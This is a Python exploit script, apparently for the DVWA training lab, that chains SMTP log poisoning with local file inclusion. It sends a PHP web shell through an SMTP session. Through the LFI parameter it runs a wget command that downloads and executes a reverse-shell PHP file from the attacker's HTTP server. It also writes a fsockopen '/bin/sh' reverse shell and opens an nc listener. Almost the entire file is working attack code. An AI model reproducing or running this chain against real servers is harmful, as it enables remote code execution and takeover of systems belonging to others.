#!/usr/bin/python3
import os
import sys
import socket
import random
import requests
import threading
import http.server
import socketserver
from urllib.parse import urlparse

red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;36m"
white = "\033[1;37m"


def banner():
	print (yellow+"[++]"+white+"+=======================================================+"+yellow+"[++]")
	print (yellow+"[++]"+white+"|                 "+yellow+" P4ySmTp" +white+" (version DVWA)               |"+yellow+"[++]")
	print (yellow+"[++]"+white+"|"+blue+"Use:python3 dvwaPaySmtp.py host port user              "+white+"|"+yellow+"[++]")
	print (yellow+"[++]"+white+"|"+blue+"Example:python3 dvwaPaySmtp.py 192.168.0.10 25 www-data"+white+"|"+yellow+"[++]")
	print (yellow+"[++]"+white+"+=======================================================+"+yellow+"[++]")


def conn_login():
        url_req = '{a}&cmd=wget%20http://{b}:{c}/reverse.php%20-O%20/tmp/reverse.php;php%20/tmp/reverse.php'.format(a=url, b=ip, c=port_server)
        #REDIRECT_URL_LOGIN
        redirect = requests.get(url_req)
        redirect_url = (redirect.url)
        #EXTRACT_IP
        extract = urlparse(url)
        ext = (extract.hostname)
        with requests.Session() as s:

                payload = {
                        'username':'{}'.format(user),
                        'password':'{}'.format(passwd),
                        'Login':'Login'
                 }

		#SECURITY LEVEL(DVWA)
                level_payload = {
                        'security':'{}'.format(sec_level),
                        'seclev_submit':'Submit'
                 }



                s.post(redirect_url,data=payload)
                f = s.post("http://{}/dvwa/security.php".format(ext),data=level_payload)
                f = s.get(url_req)


def payload_php():
	rev_php = "<?php $sock=fsockopen('{a}',{b});exec('/bin/sh -i <&3 >&3 2>&3');?>".format(a=str(ip), b=int(port))
	with open("reverse.php","a") as reverse_php:
        	reverse_php.write(str(rev_php))


try:

	if len(sys.argv) != 4:
		banner()

	else:
		banner()


		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((sys.argv[1],int(sys.argv[2])))
		sock = (str(s.recv(1024)).strip('b'))
		print (yellow+"[++]"+red+" Connected to: "+green, sock)
		print (yellow+"[++]"+green+"Sending Payload")

		s.send(bytes("helo "+sys.argv[1]+"\r\n", "utf-8"))
		s.send(bytes("MAIL FROM:<exploit>\r\n", "utf-8"))
		s.send(bytes("RCPT TO:<"+sys.argv[3]+">\r\n", "utf-8"))
		s.send(bytes("DATA\r\n", "utf-8"))
		s.send(bytes("<?php system($_GET['cmd']);?>\r\n", "utf-8"))
		print (yellow+"[++]"+red+"<?php system($_GET["+green+"'cmd'"+red+"]);?>")
		s.send(bytes(".\r\n", "utf-8"))
		s.send(bytes("QUIT\r\n", "utf-8"))
		print (yellow+"["+green+"**"+yellow+"]"+green+"Payload Successful ")

		# REVERSE SHELL
		print (yellow+"[++]"+red+"                    ***Reverse_Shell***"+white)

		sec_level = input(yellow+"[++]"+red+str("(DVWA)Select Level > "+green+"low"+red+" | "+green+"medium"+red+" | "+green+"high"+red+" : ")+white)
		url = input(yellow+"[++]"+red+"URL/LFI: "+white)
		user = input(yellow+"[++]"+red+"User: "+white)
		passwd = input(yellow+"[++]"+red+"Password: "+white)
		ip = str(input(yellow+"[++]"+red+"lhost: "+white))
		port = int(input(yellow+"[++]"+red+"lport: "+white))
		payload_php()

		#HTTP SERVER
		port_server = (random.randrange(80, 65535))
		Handler = http.server.SimpleHTTPRequestHandler
		httpd = socketserver.TCPServer(("", port_server), Handler)
		server_thread = threading.Thread(target=httpd.serve_forever)
		server_thread.daemon = True
		server_thread.start()

		#HTTP CLIENT
		client_thread = threading.Thread(target=conn_login)
		client_thread.start()
		os.system("nc -nlp {}".format(port))
		os.system("rm reverse.php")
		httpd.shutdown()
		httpd.server_close()
except:
	print (yellow+"["+red+"!!"+yellow+"]"+red+" Payload Failed "+yellow+"["+red+"!!"+yellow+"]")


